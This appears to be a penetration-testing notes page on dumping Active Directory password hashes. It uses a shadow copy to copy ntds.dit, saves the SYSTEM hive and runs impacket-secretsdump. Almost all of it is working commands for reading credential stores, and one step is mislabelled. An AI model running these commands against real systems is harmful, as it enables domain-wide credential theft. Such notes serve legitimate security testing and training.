# Shadow Copies



Launch an elevated command prompt and run the **vshadow** utility to perform a shadow copy of the entire C: drive:

```powershell
vshadow.exe -nw -p  C:
```

* **-nw:** [_disable writers_](https://learn.microsoft.com/en-us/windows/win32/vss/shadow-copy-creation-details) _(_&#x73;peeds up backup creation)
* **-p:** store the copy on disk

Take note of the Shadow copy device name: <mark style="color:red;">`Shadow copy device name: \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`</mark>

Copy the whole AD Database from the shadow copy to the **C:** drive root folder:

{% code overflow="wrap" %}
```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```
{% endcode %}

* specify the _shadow copy device name_ and add the full **ntds.dit** path

Copy the ntds database to the C: drive:

```powershell
reg.exe save hklm\system c:\system.bak
```



{% code overflow="wrap" %}
```sh
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
{% endcode %}

